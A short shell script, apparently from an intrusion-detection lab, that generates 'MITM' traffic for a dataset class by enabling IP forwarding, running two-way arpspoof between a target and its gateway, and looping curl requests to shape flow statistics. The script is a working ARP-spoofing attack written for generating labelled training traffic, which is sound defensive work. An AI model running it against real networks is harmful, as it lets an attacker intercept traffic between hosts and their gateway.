#!/bin/sh
# mitm_attack.sh  ->  intended model class: "MITM"  (BEST-EFFORT)
#
# Dataset MITM is distinctive: forward bulk ~0 but BACKWARD bulk ~99% nonzero
# (the victim/server sends the data burst while the attacker uploads nothing) with
# Pkt Len ~98, 0 fwd / 1 bwd. So we make the victim send bulk responses while the
# attacker only issues tiny requests (download-skewed), plus arpspoof for realism
# (needs NET_ADMIN cap on iot-attacker). This is the hardest class to reproduce
# in-lab; verify with the diagnostic.

echo "[MITM] Starting..."
TARGET="${TARGET_HOST:-172.20.0.50}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"
GATEWAY="${GATEWAY:-$(echo "$TARGET" | sed 's/\.[0-9]*$/.1/')}"
IFACE="${IFACE:-eth0}"
END=$(($(date +%s) + DURATION))

rnd() { awk "BEGIN{srand();print int(rand()*$1)+1}"; }

case "$INTENSITY" in
    low)    REPS=10; SLEEP_MAX=4 ;;
    high)   REPS=40; SLEEP_MAX=1 ;;
    *)      REPS=20; SLEEP_MAX=2 ;;  # medium
esac

echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
arpspoof -i "$IFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
S1=$!
arpspoof -i "$IFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
S2=$!

while [ "$(date +%s)" -lt "$END" ]; do
    k=0
    while [ "$k" -lt "$REPS" ]; do
        # tiny forward request, large backward response -> backward bulk only
        curl -s -o /dev/null -m 4 "http://$TARGET/" 2>/dev/null
        k=$((k + 1))
    done
    sleep "$(rnd "$SLEEP_MAX")"
done

kill "$S1" "$S2" 2>/dev/null
echo "[MITM] Done."
